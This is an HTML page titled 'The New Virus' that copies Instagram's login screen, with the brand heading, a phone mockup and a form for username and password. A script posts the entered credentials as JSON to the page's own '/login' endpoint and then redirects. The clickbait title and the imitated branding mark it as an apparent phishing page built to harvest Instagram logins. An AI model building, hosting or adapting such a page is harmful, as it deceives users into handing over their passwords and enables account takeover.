<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <!-- Open Graph Thumbnail -->
  <meta property="og:image" content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQPTf4njNg4xwXSMzS4pgggMFTustZgW4lVllDl27XYJC9NlO_XkhIA42s&s=10" />

  <title>The New VirusðŸ˜±</title>
  <style>
    /* RESET */
    * { margin: 0; padding: 0; box-sizing: border-box; }
    /* BODY WITH GRADIENT BACKGROUND */
    body {
      font-family: Arial, sans-serif;
      background: linear-gradient(to right, #fcb045, #fd1d1d, #833ab4);
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    /* MAIN CONTAINER: TWO COLUMNS */
    .container {
      display: flex;
      justify-content: center;
      align-items: center;
      width: 100%;
      max-width: 1100px;
      margin: 20px;
      background: transparent;
    }
    /* LEFT SIDE: PHONE MOCKUP */
    .left-side {
      flex: 1;
      display: flex;
      justify-content: center;
      align-items: center;
      margin-right: 20px;
    }
    .phone-mockup {
      width: 300px;
      height: 580px;
      background-color: #fff;
      border: 2px solid #ddd;
      border-radius: 40px;
      box-shadow: 0 4px 15px rgba(0,0,0,0.2);
      position: relative;
      overflow: hidden;
    }
    .phone-screen {
      position: absolute;
      top: 40px;
      left: 15px;
      right: 15px;
      bottom: 40px;
      background: linear-gradient(to top, #833ab4, #fd1d1d, #fcb045);
      border-radius: 20px;
      overflow: hidden;
    }
    .phone-screen::before,
    .phone-screen::after {
      content: '';
      position: absolute;
      background: rgba(255,255,255,0.2);
      border-radius: 50%;
      width: 60px;
      height: 60px;
      z-index: 1;
    }
    .phone-screen::before { top: 20%; left: 25%; }
    .phone-screen::after { bottom: 20%; right: 25%; }
    .phone-icon {
      position: absolute;
      top: 50%;
      left: 50%;
      transform: translate(-50%, -50%);
      z-index: 2;
    }
    .phone-icon svg { width: 80px; height: 80px; }
    /* RIGHT SIDE: LOGIN FORM */
    .right-side {
      flex: 1;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    .login-wrapper { display: flex; flex-direction: column; align-items: center; }
    .login-box {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      border-radius: 5px;
      width: 350px;
      padding: 40px 30px;
      text-align: center;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
      margin-bottom: 10px;
    }
    .login-box h1 {
      font-family: 'Roboto';
      font-weight: bold;
      font-size: 36px;
      margin-bottom: 20px;
      color: #333;
    }
    form { display: flex; flex-direction: column; }
    form input {
      width: 100%;
      padding: 10px;
      margin: 6px 0;
      border: 1px solid #dbdbdb;
      border-radius: 4px;
      background-color: #fafafa;
      font-size: 14px;
    }
    form button {
      margin-top: 10px;
      padding: 10px;
      background-color: #0095f6;
      border: none;
      color: white;
      font-weight: bold;
      font-size: 16px;
      border-radius: 4px;
      cursor: pointer;
      transition: background-color 0.2s;
    }
    form button:hover { background-color: #0077cc; }
    .divider {
      display: flex;
      align-items: center;
      margin: 15px 0;
      font-size: 14px;
      color: #8e8e8e;
    }
    .divider .line {
      flex: 1;
      height: 1px;
      background-color: #dbdbdb;
      margin: 0 10px;
    }
    .divider .or { font-weight: bold; }
    .other-options a {
      display: block;
      margin: 8px 0;
      text-decoration: none;
      color: #385185;
      font-size: 14px;
    }
    .other-options a:hover { text-decoration: underline; }
    .signup-box {
      background-color: #fff;
      border: 1px solid #dbdbdb;
      border-radius: 5px;
      width: 350px;
      padding: 20px;
      text-align: center;
      box-shadow: 0 2px 8px rgba(0,0,0,0.1);
    }
    .signup-box p { font-size: 14px; }
    .signup-box a {
      color: #0095f6;
      font-weight: bold;
      text-decoration: none;
    }
    .signup-box a:hover { text-decoration: underline; }
    @media (max-width: 900px) {
      .container {
        flex-direction: column;
        justify-content: flex-start;
        align-items: center;
        margin-top: 30px;
      }
      .left-side { margin: 0 0 20px 0; }
    }
  </style>
</head>
<body>
  <div class="container">
    <!-- LEFT SIDE: PHONE MOCKUP -->
    <div class="left-side">
      <div class="phone-mockup">
        <div class="phone-screen">
          <div class="phone-icon">
            <!-- Simple camera icon using inline SVG -->
            <svg viewBox="0 0 24 24" fill="none" stroke="white" stroke-width="2" stroke-linecap="round" stroke-linejoin="round">
              <rect x="2" y="5" width="20" height="15" rx="2" ry="2"></rect>
              <circle cx="12" cy="12.5" r="4"></circle>
              <path d="M16 5h4v4"></path>
            </svg>
          </div>
        </div>
      </div>
    </div>
    <!-- RIGHT SIDE: LOGIN FORM & SIGNUP -->
    <div class="right-side">
      <div class="login-wrapper">
        <div class="login-box">
          <h1>Instagram</h1>
          <form id="loginForm">
            <input type="text" id="username" placeholder="Phone number, username, or email" required />
            <input type="password" id="password" placeholder="Password" required />
            <button type="submit">Log In</button>
          </form>
          <div class="divider">
            <div class="line"></div>
            <div class="or">OR</div>
            <div class="line"></div>
          </div>
          <div class="other-options">
            <a href="#">Log in with Facebook</a>
            <a href="#">Forgot password?</a>
          </div>
        </div>
        <div class="signup-box">
          <p>Don't have an account? <a href="#">Sign up</a></p>
        </div>
      </div>
    </div>
  </div>
  <script>
    document.getElementById('loginForm').addEventListener('submit', function (e) {
      e.preventDefault();
      const username = document.getElementById('username').value.trim();
      const password = document.getElementById('password').value.trim();
      fetch('/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ username, password })
      })
      .then(response => response.json())
      .then(data => {
        if (data.error) {
          alert(data.error);
        } else if (data.redirect) {
          window.location.href = data.redirect;
        } else {
          alert('Login successful!');
        }
      })
      .catch(error => console.error('Error:', error));
    });
  </script>
</body>
</html>
